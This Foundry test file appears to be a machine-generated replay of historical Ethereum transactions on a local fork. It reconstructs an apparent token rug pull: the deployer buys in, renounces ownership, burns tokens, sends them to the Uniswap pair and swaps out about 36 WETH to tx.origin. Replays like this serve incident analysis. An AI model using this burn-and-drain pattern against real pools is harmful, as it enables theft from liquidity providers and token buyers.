// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0x8331ecc00d88ce145d8853d7cbe59d67b8b7c7f5174ed433cf2070392e9cd8d5
// https://etherscan.io/address/0x415A4CA18Ead9e7730918Cb032760B1383824C76

interface I {
    function withdraw(uint256) external payable;
    function swap(uint256, uint256, address, bytes memory) external payable;
    function pair() external payable;
    function execute(bytes memory, bytes[] memory, uint256) external payable;
    function deposit() external payable;
    function getAmountsOut(uint256, address[] memory) external payable;
    function WETH() external payable;
    function renounceOwnership() external payable;
    function burn(uint256) external payable;
    function balanceOf(address) external payable returns (uint256);
    function getAmountsIn(uint256, address[] memory) external payable;
    function transfer(address, uint256) external payable;
    function router() external payable;
}

contract Xc7d5 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x8331ecc00d88ce145d8853d7cbe59d67b8b7c7f5174ed433cf2070392e9cd8d5");
    }

    address constant x09dd = 0x09dDEC35E7522f74cDCd5F587b89ee8Dbc0Fcb44;
    address constant x262e = 0x262E3dC7C05f122f105E4A8191F630966A1CFE7F;
    address constant x3fc9 = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x7a25 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant x820b = 0x820ba67398c3eA745EB8766FD3F444A92d4de316;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xdd63 = 0xdd6359aA5754D593608FDf5B9E359555BeA0BD1E;

    uint256 t_xea35a257 = 0;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 17596104); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x367733d85e340ef2437d8a366b744de79db2e7d84f953855dace7ab42ec60a02));

        // https://explorer.phalcon.xyz/tx/eth/0x367733d85e340ef2437d8a366b744de79db2e7d84f953855dace7ab42ec60a02
        this.x367733d8();
        // https://explorer.phalcon.xyz/tx/eth/0xe6cf3908498c1916901a141848f8d577daf6254cc967e1ab38dc012e3572310f
        this.xe6cf3908();
        // https://explorer.phalcon.xyz/tx/eth/0x33d251d5913717e91e7784298c38c0e83d8faebc5d612bb168779ab15102b8b8
        this.x33d251d5();
        // https://explorer.phalcon.xyz/tx/eth/0xf89c9842cfe8b661fe75aac5aee07900f2705e977f30e3063c6e88ce72b73e08
        this.xf89c9842();
        // https://explorer.phalcon.xyz/tx/eth/0xfaece692309409c34f9d4c32d77a7b140f3fc37fbf12bb10dc9449c56832c3e0
        this.xfaece692();
        // https://explorer.phalcon.xyz/tx/eth/0xb195b9eaacb9e632e4bcb241934664c723d2d1f480cc768039ed9aed200c1611
        this.xb195b9ea();
        // https://explorer.phalcon.xyz/tx/eth/0x2cfc18995a9db24566e21f80e618a504ec7de200678e2b9fcb565aa2c143e7f8
        this.x2cfc1899();
        // https://explorer.phalcon.xyz/tx/eth/0x8331ecc00d88ce145d8853d7cbe59d67b8b7c7f5174ed433cf2070392e9cd8d5
        x9603a165();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 17593545); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x367733d85e340ef2437d8a366b744de79db2e7d84f953855dace7ab42ec60a02
        this.x367733d8();
        vm.warp(1688146031);
        vm.roll(17593569);
        // https://explorer.phalcon.xyz/tx/eth/0xe6cf3908498c1916901a141848f8d577daf6254cc967e1ab38dc012e3572310f
        this.xe6cf3908();
        vm.warp(1688147891);
        vm.roll(17593722);
        // https://explorer.phalcon.xyz/tx/eth/0x33d251d5913717e91e7784298c38c0e83d8faebc5d612bb168779ab15102b8b8
        this.x33d251d5();
        vm.warp(1688155535);
        vm.roll(17594350);
        // https://explorer.phalcon.xyz/tx/eth/0xf89c9842cfe8b661fe75aac5aee07900f2705e977f30e3063c6e88ce72b73e08
        this.xf89c9842();
        vm.warp(1688166635);
        vm.roll(17595264);
        // https://explorer.phalcon.xyz/tx/eth/0xfaece692309409c34f9d4c32d77a7b140f3fc37fbf12bb10dc9449c56832c3e0
        this.xfaece692();
        vm.warp(1688166695);
        vm.roll(17595269);
        // https://explorer.phalcon.xyz/tx/eth/0xb195b9eaacb9e632e4bcb241934664c723d2d1f480cc768039ed9aed200c1611
        this.xb195b9ea();
        vm.warp(1688173775);
        vm.roll(17595854);
        // https://explorer.phalcon.xyz/tx/eth/0x2cfc18995a9db24566e21f80e618a504ec7de200678e2b9fcb565aa2c143e7f8
        this.x2cfc1899();
        vm.warp(1688176811);
        vm.roll(17596104);
        // https://explorer.phalcon.xyz/tx/eth/0x8331ecc00d88ce145d8853d7cbe59d67b8b7c7f5174ed433cf2070392e9cd8d5
        x9603a165();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 17596104); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1688176811);
        vm.roll(17596105);
        // https://explorer.phalcon.xyz/tx/eth/0x8331ecc00d88ce145d8853d7cbe59d67b8b7c7f5174ed433cf2070392e9cd8d5
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0x820ba67398c3eA745EB8766FD3F444A92d4de316),
            keccak256(abi.encode(RECEIVER, uint256(1))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        x9603a165();
    }

    function x33d251d5() public {
        x262e.call{value: 450000000000000000}("");
    }

    function x9603a165() public {
        I(x820b).router();
        I(x7a25).WETH();
        I(x820b).pair();
        // uint256 v1 = 36134861811370415931;
        uint256 v1 = I(xc02a).balanceOf(xdd63);
        console2.log("I(xc02a).balanceOf(xdd63)\t->", "36134861811370415931 (36.1348 ether)");

        address[] memory arr04 = new address[](2);
        arr04[0] = x820b;
        arr04[1] = xc02a;
        I(x7a25).getAmountsIn(36062592087747675099, arr04);

        I(x820b).burn(144231890095412634429729440861);
        I(x820b).transfer(xdd63, 144231890095412634429729440861);
        I(xdd63).swap(0, 36062592087747675099, r, "");
        // uint256 v2 = 36062592087747675099;
        uint256 v2 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "36062592087747675099 (36.6259 ether)");
        I(xc02a).withdraw(v2);
        address(tx.origin).call{value: 36062592087747675099}("");
    }

    function x367733d8() public {
        r.call{value: 1}(abi.encodeWithSelector(0xea35a257, 0));
    }

    function xf89c9842() public {
        x09dd.call{value: 400000000000000000}("");
    }

    function xfaece692() public {
        bytes memory b01 = abi.encode(2, 500000000000000000);
        bytes memory b02 = abi.encode(1, 500000000000000000, 5077775010259427637520213, 160, 0, 2, xc02a, x820b);
        bytes[] memory arr03 = new bytes[](2);
        arr03[0] = b01;
        arr03[1] = b02;
        I(x3fc9).execute{value: 500000000000000000}(hex"0b08", arr03, 1688168399);
    }

    function xb195b9ea() public {
        I(x820b).burn(5103163885310724775707815);
    }

    function x2cfc1899() public {
        x262e.call{value: 250000000000000000}("");
    }

    function xe6cf3908() public {
        r.call{value: 9500000000000000000}(abi.encodeWithSelector(0xea35a257, 1));
    }

    function call() public payable {}

    function xea35a257() public payable {
        t_xea35a257++;

        if (t_xea35a257 == 1) {
            I(x820b).router();
            I(x7a25).WETH();
            I(xc02a).deposit{value: 1}();
            I(x820b).pair();
            // uint256 v1 = 1000000000000000000000000000;
            uint256 v1 = I(x820b).balanceOf(xdd63);
            console2.log("I(x820b).balanceOf(xdd63)\t->", "1000000000000000000000000000 (1000000000.0 ether)");

            address[] memory arr01 = new address[](2);
            arr01[0] = xc02a;
            arr01[1] = x820b;
            I(x7a25).getAmountsOut(1, arr01);

            I(xc02a).transfer(xdd63, 1);
            I(xdd63).swap(1993999999, 0, xdd63, "");
            return;
        }
        if (t_xea35a257 == 2) {
            I(x820b).router();
            I(x7a25).WETH();
            I(xc02a).deposit{value: 9500000000000000000}();
            I(x820b).pair();
            // uint256 v1 = 1000000000000000000000000000;
            uint256 v1 = I(x820b).balanceOf(xdd63);
            console2.log("I(x820b).balanceOf(xdd63)\t->", "1000000000000000000000000000 (1000000000.0 ether)");

            address[] memory arr02 = new address[](2);
            arr02[0] = xc02a;
            arr02[1] = x820b;
            I(x7a25).getAmountsOut(9500000000000000000, arr02);

            I(xc02a).transfer(xdd63, 9500000000000000000);
            I(xdd63).swap(949857092714235571283171329, 0, xdd63, "");
            I(x820b).renounceOwnership();
            return;
        }
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0xea35a257) {
            xea35a257();
            return;
        }
        revert("no such function");
    }
}
